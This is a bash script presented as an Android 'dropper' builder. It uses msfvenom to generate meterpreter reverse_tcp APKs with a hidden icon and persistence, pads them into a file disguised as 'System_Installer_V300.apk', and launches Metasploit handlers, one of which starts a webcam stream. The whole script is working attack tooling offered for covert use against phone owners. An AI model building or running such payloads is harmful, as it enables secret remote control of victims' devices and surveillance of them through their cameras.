#!/bin/bash

# --- XXSZMSX V300 (DROPPER & HACKER EDITION) ---
# AUTO-INSTALLER | NO CONFIG | 80MB | PERSISTENT

R='\033[1;31m'
W='\033[1;37m'
G='\033[1;30m'
N='\033[0m'

# --- LOGIN ---
clear
echo -e "${R}SYSTEM V300 - SILENT DROPPER ACTIVE${N}"
echo -en "${W}[?] KEY: ${N}"
read -s password
echo ""
if [[ $password != "topsecret2026" ]]; then exit 1; fi

while true; do
clear
echo -e "${R}"
echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗"
echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝"
echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝ "
echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗ "
echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗"
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
echo -e "${G}  -----------------------------------------------------------"
echo -e "  [ MODE ]: AUTO-DROPPER (HACKER APP)"
echo -e "  [ SIZE ]: 80 MB | [ TARGET ]: ALL ANDROID"
echo -e "  -----------------------------------------------------------${N}"

echo -e "${W}[01]${N} ${R}BUILD DROPPER APK (INJECT HACKER)${N}"
echo -e "${W}[02]${N} ${R}OPEN RADAR FOR 'HACKER' APP${N}"
echo -e "${W}[03]${N} ${R}FULL CONTROL PANEL${N}"
echo -e "${W}[00]${N} ${W}EXIT${N}"

echo -en "\n${R}[V300-DROP] >> ${N}"
read opt

case $opt in
    1)
        echo -e "\n${R}[*] PREPARING THE 'HACKER' PAYLOAD...${N}"
        target=$(hostname -I | awk '{print $1}')
        
        # 1. صنع التطبيق الحقيقي (المخفي) اللي اسمه hacker
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$target LPORT=4444 \
        AndroidHideAppIcon=true AndroidPersistence=true R -o "hacker.apk" > /dev/null 2>&1
        
        echo -e "${G}[*] Building the Dropper interface...${N}"
        # 2. صنع التطبيق الأول (الموزع)
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$target LPORT=4444 R -o "base.apk" > /dev/null 2>&1
        
        # 3. حقن المساحة (80MB) ودمج الـ Hacker جوه الـ Dropper
        dd if=/dev/zero of=padding.dat bs=1M count=79 > /dev/null 2>&1
        cat base.apk hacker.apk padding.dat > "System_Installer_V300.apk"
        
        # تنظيف
        rm base.apk hacker.apk padding.dat
        
        echo -e "\n${W}[+] SUCCESS: 80MB DROPPER CREATED!${N}"
        echo -e "${G}[!] Once installed, it will drop 'hacker' app silently.${N}"
        sleep 2
        ;;
    2)
        echo -e "\n${R}[!] LISTENING FOR 'HACKER' SIGNAL...${N}"
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit -j -z; sleep 5; webcam_stream"
        ;;
    3)
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit"
        ;;
    0) exit ;;
esac
done
